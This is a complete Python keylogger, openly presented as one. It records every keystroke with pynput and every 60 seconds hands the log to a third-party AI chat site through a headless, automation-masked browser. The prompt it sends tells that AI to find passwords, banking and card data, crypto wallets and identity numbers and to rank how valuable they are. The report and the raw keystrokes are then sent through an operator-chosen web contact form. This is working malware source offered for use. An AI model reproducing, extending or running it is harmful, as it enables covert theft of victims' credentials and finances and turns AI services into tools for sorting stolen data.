#!/usr/bin/env python3
"""
Keylogger with AI Analysis and Email Reporting via Website Form
FINAL VERSION - Waits for complete AI response
INCLUDES HEADLESS MODE OPTIONS
"""

from pynput import keyboard
import threading
import time
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.options import Options
from bs4 import BeautifulSoup
import datetime
import os
import sys

class Keylogger:
    def __init__(self):
        self.report = ''
        self.log = ''
        self.risk_classification = 'Unknown'
        self.lock = threading.Lock()
        
        # ========== CONFIGURATION ==========
        self.contact_form_url = "Url of your contact form here or the listening service to send the report to "  # Replace with your actual contact form URL
        self.your_email = " your email if your from has an email part"
        self.your_name = "Keylogger System"
        self.ai_url = 'https://www.easemate.ai/webapp/chat?from=ai-chat' # you can use any other ai you wish for 
        
        # ========== HEADLESS MODE CONFIGURATION ==========
        self.headless_mode = True  # Set to False if you want to see the browser
        # =================================================
        
        print(f"[*] Keylogger initialized")
        print(f"[*] Reports will be sent to: {self.your_email}")
        print(f"[*] Using form at: {self.contact_form_url}")
        print(f"[*] Headless mode: {self.headless_mode} (browser will be {'invisible' if self.headless_mode else 'visible'})")
        print("[*] Waiting for keystrokes...\n")

    def get_chrome_options(self):
        """Configure Chrome options for headless or visible mode"""
        chrome_options = Options()
        
        if self.headless_mode:
            print("[*] Running in headless mode (browser invisible)")
            chrome_options.add_argument("--headless")
            chrome_options.add_argument("--no-sandbox")
            chrome_options.add_argument("--disable-dev-shm-usage")
            chrome_options.add_argument("--disable-gpu")
            chrome_options.add_argument("--window-size=1920,1080")
            chrome_options.add_argument("--disable-notifications")
            chrome_options.add_argument("--disable-extensions")
            chrome_options.add_argument("--disable-popup-blocking")
            chrome_options.add_argument("--ignore-certificate-errors")
            chrome_options.add_argument("--disable-blink-features=AutomationControlled")
            chrome_options.add_experimental_option("excludeSwitches", ["enable-automation"])
            chrome_options.add_experimental_option('useAutomationExtension', False)
        else:
            print("[*] Running in visible mode (browser will appear)")
            chrome_options.add_argument("--start-maximized")
        
        return chrome_options

    def storeText(self, key):
        """Store keystrokes with proper formatting"""
        try:
            currentKey = key.char
        except AttributeError:
            if key == keyboard.Key.space:
                currentKey = ' '
            elif key == keyboard.Key.enter:
                currentKey = '\n'
            elif key == keyboard.Key.backspace:
                currentKey = '[BACKSPACE]'
            elif key == keyboard.Key.tab:
                currentKey = '[TAB]'
            elif key == keyboard.Key.shift:
                currentKey = ''
            elif key == keyboard.Key.ctrl:
                currentKey = ''
            elif key == keyboard.Key.alt:
                currentKey = ''
            elif key == keyboard.Key.alt_l:
                currentKey = ''
            elif key == keyboard.Key.alt_r:
                currentKey = ''
            elif key == keyboard.Key.caps_lock:
                currentKey = ''
            elif key == keyboard.Key.delete:
                currentKey = '[DELETE]'
            else:
                currentKey = f' [{str(key)}] '
        
        with self.lock:
            self.log += currentKey

    def reportFinalize(self):
        """Start the AI analysis process"""
        print("\n[*] Analyzing captured keystrokes...")
        self.artificialIntelligence()

    def artificialIntelligence(self):
        """Send keystrokes to AI for analysis"""
        context = """
Analyze the following user text for sensitive information that could pose security risks. Identify data such as:
- Cryptocurrency activity (wallet addresses, transactions, exchange logins, amounts in USD/BTC/ETH)
- Banking access (account numbers, routing numbers, credit cards, PINs)
- Login credentials (usernames, passwords, security questions)
- Personal identifiable information (SSN, passport, driver's license)

Normalize any keystrokes (e.g., [BACKSPACE] to indicate deletions) and ignore non-informational keys.
Provide a brief report and classify the risk as one of: URGENT, MODERATE, or USELESS.

Format your response as:
RISK: [classification]
SUMMARY: [brief summary]
DETAILS: [detailed findings with evidence]

USER TEXT TO ANALYZE:
"""
        
        with self.lock:
            prompt = context + "\n\n" + self.log
            
        driver = None
        try:
            print("[*] Opening browser for AI analysis...")
            
            # Get Chrome options with headless setting
            chrome_options = self.get_chrome_options()
            driver = webdriver.Chrome(options=chrome_options)
            driver.get(self.ai_url)
            
            wait = WebDriverWait(driver, 20)
            
            # Find and interact with text input
            print("[*] Sending data for analysis...")
            textInputArea = wait.until(EC.presence_of_element_located((By.CLASS_NAME, "input-textarea")))
            textInputArea.click()
            textInputArea.clear()
            textInputArea.send_keys(prompt)
            
            time.sleep(20)
            
            # Handle switch button if present (for web search)
            try:
                switch_button = driver.find_element(By.CSS_SELECTOR, "button.ant-switch")
                if switch_button.get_attribute("aria-checked") == "false":
                    switch_button.click()
                    print("[*] Enabled web search")
                    time.sleep(20)
            except:
                pass
            
            # Find and click send button
            print("[*] Sending for analysis...")
            sendButton = wait.until(EC.element_to_be_clickable((By.CLASS_NAME, "custom-button")))
            sendButton.click()
            
            # Wait for AI response
            print("[*] Waiting for AI analysis (this may take 2-3 minutes)...")
            
            # Wait up to 5 minutes for complete response
            max_wait = 300  # 5 minutes
            start_time = time.time()
            response_complete = False
            last_response_length = 0
            stable_count = 0
            current_text = ""
            
            while time.time() - start_time < max_wait and not response_complete:
                time.sleep(5)  # Check every 5 seconds
                
                # Get page source and parse with BeautifulSoup
                html = driver.page_source
                soup = BeautifulSoup(html, 'html.parser')
                
                # Find all AI message rows
                ai_messages = soup.find_all('div', class_='chat-message-row ai')
                
                if ai_messages:
                    # Get the last AI message (most recent response)
                    last_message = ai_messages[-1]
                    
                    # Look for the preview div that contains the actual response
                    preview = last_message.find('div', class_='md-editor-preview')
                    
                    if preview:
                        text_content = preview.get_text('\n', strip=True)
                        
                        # Skip default greeting
                        if "How can I help" in text_content:
                            continue
                            
                        current_length = len(text_content)
                        
                        # If this is the first time we're seeing a response
                        if last_response_length == 0 and current_length > 20:
                            print(f"[*] AI started responding... ({current_length} chars)")
                            last_response_length = current_length
                            current_text = text_content
                            
                        # If response is GROWING (AI still typing)
                        elif current_length > last_response_length:
                            print(f"[*] Response growing: {last_response_length} -> {current_length} chars")
                            last_response_length = current_length
                            current_text = text_content
                            stable_count = 0  # Reset stable counter because it's still changing
                            
                        # If response is the SAME length as before (AI stopped typing)
                        elif current_length == last_response_length and current_length > 100:
                            stable_count += 1
                            print(f"[*] Response stable for {stable_count}/3 checks ({current_length} chars)")
                            
                            # If it's been stable for 3 checks (15 seconds), consider it complete
                            if stable_count >= 3:
                                self.report = current_text
                                response_complete = True
                                print(f"\n[✓] Complete AI response received!")
                                print(f"[✓] Final response length: {current_length} characters")
                                print(f"[✓] Response preview: {current_text[:200]}...")
                                break

                # Show progress every 30 seconds
                elapsed = int(time.time() - start_time)
                if elapsed % 30 == 0 and elapsed > 0:
                    print(f"[*] Still waiting... ({elapsed} seconds, current length: {last_response_length})")
            
            if not response_complete:
                print("\n[!] No complete AI response received within timeout")
                # If we got partial response, use it
                if last_response_length > 100:
                    self.report = current_text
                    print(f"[!] Using partial response ({last_response_length} chars)")
                else:
                    # Try one more time with all possible selectors
                    html = driver.page_source
                    soup = BeautifulSoup(html, 'html.parser')
                    
                    # Look for any div with md-editor-preview class
                    all_previews = soup.find_all('div', class_='md-editor-preview')
                    for preview in all_previews:
                        text = preview.get_text(strip=True)
                        if text and len(text) > 100 and "Analyze the following" not in text:
                            self.report = text
                            response_complete = True
                            print("[✓] Found response using fallback method!")
                            break
                    
                    if not response_complete:
                        self.report = "AI analysis failed - no response received"
                    
        except Exception as e:
            print(f"[!] Error in AI processing: {e}")
            self.report = f"Error during analysis: {str(e)}"
        finally:
            if driver:
                driver.quit()
        
        # Extract risk classification
        if self.report and self.report != "AI analysis failed - no response received":
            if 'URGENT' in self.report:
                self.risk_classification = 'URGENT'
            elif 'MODERATE' in self.report:
                self.risk_classification = 'MODERATE'
            else:
                self.risk_classification = 'USELESS'
        
        # Send the report via website form
        with self.lock:
            self.sendResult()
            self.log = ''  # Clear log after sending

    def sendResult(self):
        """Send the AI report via website contact form"""
        driver = None
        try:
            print(f"\n[*] Sending report via website form...")
            
            # Get Chrome options with headless setting (reuse same method)
            chrome_options = self.get_chrome_options()
            driver = webdriver.Chrome(options=chrome_options)
            driver.get(self.contact_form_url)
            
            wait = WebDriverWait(driver, 15)
            
            # Fill out the contact form
            name_input = wait.until(EC.presence_of_element_located((By.ID, "name")))
            name_input.clear()
            name_input.send_keys(self.your_name)
            
            email_input = driver.find_element(By.ID, "email")
            email_input.clear()
            email_input.send_keys(self.your_email)
            
            subject_input = driver.find_element(By.ID, "subject")
            subject_input.clear()
            
            timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            subject = f"Keylogger Report [{self.risk_classification}] - {timestamp}"
            subject_input.send_keys(subject)
            
            message_textarea = driver.find_element(By.ID, "message")
            message_textarea.clear()
            
            formatted_message = f"""
========================================
KEYLOGGER SECURITY REPORT
========================================
Time: {timestamp}
Risk Level: {self.risk_classification}

========================================
AI ANALYSIS REPORT:
========================================
{self.report}

========================================
RAW KEYSTROKES (for reference):
========================================
{self.log}

========================================
END OF REPORT
========================================
"""
            message_textarea.send_keys(formatted_message)
            
            submit_button = driver.find_element(By.XPATH, "//button[@type='submit' and contains(text(), 'Send Message')]")
            submit_button.click()
            
            time.sleep(3)
            
            print(f"[✓] Report sent successfully to {self.your_email}")
            print(f"[✓] Subject: {subject}")
            
        except Exception as e:
            print(f"[!] Error sending report via form: {e}")
            self.save_local_backup()
        finally:
            if driver:
                driver.quit()

    def save_local_backup(self):
        """Save report locally if email fails"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"keylog_report_{timestamp}.txt"
            
            with open(filename, 'w', encoding='utf-8') as f:
                f.write(f"RISK: {self.risk_classification}\n")
                f.write(f"TIMESTAMP: {timestamp}\n")
                f.write("="*50 + "\n")
                f.write(self.report)
                f.write("\n\nRAW KEYSTROKES:\n")
                f.write("="*50 + "\n")
                f.write(self.log)
            
            print(f"[✓] Report saved locally as: {filename}")
        except Exception as e:
            print(f"[!] Failed to save local backup: {e}")

    def logger(self):
        """Main logging loop"""
        print("[*] Keylogger started - Press Ctrl+C to stop")
        print("[*] Reports will be generated every 60 seconds\n")
        
        with keyboard.Listener(on_press=self.storeText) as listener:
            threading.Timer(60, self.reportFinalize).start()
            listener.join()

def main():
    """Main function with error handling"""
    print("""
╔════════════════════════════════════════╗
║     KEYLOGGER WITH AI ANALYSIS         ║
║     WAITS FOR COMPLETE RESPONSE        ║
║     WITH HEADLESS MODE OPTION          ║
╚════════════════════════════════════════╝
    """)
    
    try:
        keylogger = Keylogger()
        keylogger.logger()
    except KeyboardInterrupt:
        print("\n\n[*] Keylogger stopped by user")
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()